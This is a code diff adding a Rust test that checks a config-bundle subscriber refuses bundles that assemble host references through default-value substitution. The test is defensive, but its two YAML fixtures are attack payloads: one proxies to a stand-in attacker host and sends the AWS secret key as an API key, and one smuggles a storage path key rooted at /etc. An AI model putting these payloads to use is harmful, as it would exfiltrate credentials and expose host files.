@@ -652,6 +652,66 @@ origins:
 }
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn a_bundle_assembling_a_host_reference_from_a_default_is_refused() {
+    // WOR-2433 re-review round 3. The check above screens the raw text,
+    // and `compile_config` substitutes `${VAR:-default}` before anything
+    // parses it, so a bundle could write the host reference as a default
+    // and have the compile assemble it: `env:AWS_SECRET_ACCESS_KEY`
+    // matched none of the host-backed prefixes while it wore the
+    // placeholder, and `${SB_NOPE:-path}` in mapping-key position met no
+    // `HOST_FILE_KEYS` entry until the key had been substituted in. A
+    // config-authority bundle is on by default with no opt-out, so this
+    // is the path where it matters most.
+    let _serial = SERIAL.lock().await;
+    let temp = tempfile::tempdir().expect("temp dir");
+    let dir = temp.path();
+    let (mut subscriber, stub) =
+        applied_baseline(dir, "default-local.test", "default-authority.test").await;
+    let identity_before = pipeline_identity();
+    let mut refused_before = fetch_total("confinement_refused");
+
+    for payload in [
+        // The secret reference, assembled in value position.
+        r#"
+origins:
+  "exfil.test":
+    action:
+      type: proxy
+      url: https://collect.attacker.example
+    authentication:
+      type: api_key
+      api_key: "${SB_NOPE_2433:-env:AWS_SECRET_ACCESS_KEY}"
+"#,
+        // The host-file key, assembled in mapping-key position: after
+        // substitution this is `action.path: /etc`, which roots the
+        // storage action's object store at the host filesystem.
+        r#"
+origins:
+  "exfil.test":
+    action:
+      type: storage
+      backend: local
+      "${SB_NOPE_2433:-path}": /etc
+"#,
+    ] {
+        stub.serve(
+            sign(6, BundleMode::Overlay, payload)
+                .to_json()
+                .expect("encode"),
+        );
+        assert_eq!(
+            subscriber.poll_once().await,
+            CycleResult::ConfinementRefused
+        );
+        assert_eq!(fetch_total("confinement_refused"), refused_before + 1);
+        refused_before += 1;
+        assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
+        assert_eq!(subscriber.revision(), 5, "the cursor must not move");
+    }
+    assert!(serves("default-authority.test"), "revision 5 keeps serving");
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn a_bundle_naming_a_per_node_variable_still_applies() {
     // The other half of the same boundary: `${VAR}` is the documented
     // way a fleet-wide document names per-node values, so confinement
